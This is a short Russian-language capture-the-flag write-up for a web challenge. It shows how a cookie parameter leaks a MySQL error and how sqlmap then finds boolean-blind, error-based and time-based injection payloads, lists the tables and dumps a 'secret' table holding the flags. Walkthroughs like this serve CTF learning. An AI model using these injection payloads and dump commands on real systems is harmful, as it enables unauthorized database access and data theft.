1. `curl -v http://counter.ctf2019.rocks/`
Видим что подсчет ведется в зависимости от куки user_id=2
Подставив в куку букву, получаем mysqli_sql_exception
```bash
curl http://counter.ctf2019.rocks/ --cookie "user_id=a"
<br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Unknown column 'a' in 'where clause' in /var/www/index.php:9
Stack trace:
#0 /var/www/index.php(9): mysqli-&gt;query('UPDATE `count` ...')
#1 {main}
  thrown in <b>/var/www/index.php</b> on line <b>9</b><br />
```
2. Натравливаем sqlmap
```bash
sqlmap -u http://counter.ctf2019.rocks/ --cookie "user_id=1" --level 2
Parameter: user_id (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: user_id=1 AND 7241=(SELECT (CASE WHEN (7241=7241) THEN 7241 ELSE (SELECT 2316 UNION SELECT 2599) END))-- stfV

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: user_id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176766271,(SELECT (ELT(9237=9237,1))),0x71786b7a71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user_id=1 AND (SELECT 7725 FROM (SELECT(SLEEP(5)))VPcu)
---
```
3. Смотрим таблицы
```bash
sqlmap -u http://counter.ctf2019.rocks/ --cookie "user_id=1" --level 2 --tables

Database: counter
[2 tables]
+---------------------------------------+
| count                                 |
| secret                                |
+---------------------------------------+
```
4. Дампим secret
```bash
sqlmap -u http://counter.ctf2019.rocks/ --cookie "user_id=1" --level 2 --dump secret

[2 entries]
+-----------------------------------------+
| secret                                  |
+-----------------------------------------+
| qlvnz{74223k502uy013289w95g9yu0x26h985} |
| WGCTF{99CAF43C7F7F18B87DD6B3DCAE1CD020} |
+-----------------------------------------+
```
Собственно флаг. 

5. Доп зашифрован Виженером, пользуемся https://www.dcode.fr/vigenere-cipher

Второй найден в http://counter.ctf2019.rocks/robots.txt